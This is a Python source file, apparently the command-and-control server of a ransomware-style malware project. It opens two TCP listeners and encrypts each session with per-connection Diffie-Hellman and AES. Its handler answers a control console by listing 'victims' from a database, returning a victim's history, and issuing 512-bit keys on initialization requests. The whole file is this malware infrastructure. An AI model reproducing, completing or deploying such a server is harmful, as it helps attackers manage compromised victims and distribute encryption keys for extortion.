import socket
import threading
import utile.security as security
import queue
import utile.data as udata
import utile.message as message
from utile.network import recv_msg, send_msg

print_lock = threading.Lock()
q1 = queue.Queue()
clients = {}


class server_tcp(object):

    def __init__(self, ip, port, port2):
        """ Création des paramètres pour le serveur afin de pouvoir initialiser la connexion
        """
        self.ip = ip
        self.port = port
        self.port2 = port2

    def accept_con(self, conn):
        connexion, addr = conn.accept()
        q1.put(connexion)

    def start_server(self):
        """
        Démarrage du serveur et maintient de celui-ci + gestion des 'commandes'
        """
        # Création de la socket
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        print(f'$ Server started ! Waiting for clients...')
        try:
            # Debug & Prevent crash
            s.bind((self.ip, self.port))
            s2.bind((self.ip, self.port2))
        except socket.error as error:
            print(str(error))
        s.listen(10)
        s2.listen(10)
        while True:
            # On accepte les connexions
            t1 = threading.Thread(target=self.accept_con, args=(s,))
            t2 = threading.Thread(target=self.accept_con, args=(s2,))
            t1.start()
            t2.start()
            conn = q1.get()
            addr = conn.getpeername()
            clients[addr] = conn
            print(f'[+] {str(addr[0])}:{str(addr[1])}')
            # Nouvelle connexion détectée : On créé un thread pour celle-ci
            client_thread = threading.Thread(target=self.threaded, args=(conn, addr))
            client_thread.start()
        # Fermeture de la connexion
        s.close()
        s2.close()

    def gestion_msg(self, c, msg):
        """
        Système de gestion des commandes envoyées par la console de contrôle
        """
        conn = udata.connect_db()
        msg_type = message.get_message_type(msg)
        if msg == message.list_victim_req():
            # On va interroger le serveur SQL depuis le serveur frontal pour des raisons
            # De sécurité...
            # On envoie la liste
            listing = udata.list_victims(conn)
            conn.close()
            return str(listing)
        elif "HIST_REQ" in msg:
            # On demande un ID en particulier pour une recherche d'historique
            # On envoie l'historique
            return udata.history_req(conn, msg[-3:-2])
        elif msg == 'CHANGE_STATE':
            # C'est à faire
            return "Todo3"
        elif msg_type == "INITIALIZE_REQ":
            key_rq = security.gen_key(512)
            return key_rq
        elif msg == message.close_connexion():
            return 'Thanks you, good bye.'

    def threaded(self, c, sc):
        """
        Système de création de Threads..
        """
        print('[FiFo] Implemented')
        print('New thread started')
        print('[SecurityLayerAES]Generating Security Parameters...')
        # On initialise un protocole de sécurité AES par thread pour
        # Sécurisé de manière différente (différents nonce, key, authtag)
        # chaques connexion pour éviter de pouvoir spoof sur une autre connexion
        # tcp avec des keys d'autres connexions...
        sec_key = security.diffie_hellmand_sendk(c)
        while True:
            data = recv_msg(c, sec_key)
            if data == b'' or data is None:
                print(sc[0] + ':' + str(sc[1]) + ' >> connexion closed.')
                # Suppression du thread + Reset connexion TCP --> Suppression Thread = Force close de la connexion
                break
            # On print l'ip de la connexion et sa demande
            print(str(sc[0] + ':' + str(sc[1]) + " >> " + str(data)))
            # On construit une réponse grâce à la méthode gestion message
            rs = self.gestion_msg(c, data)
            # Build header & send it before msg
            # On l'envoie
            send_msg(c, rs, sec_key)
        # On ferme la connexion du client lors de la fin de connexion
        c.close()
        clients.pop(sc)
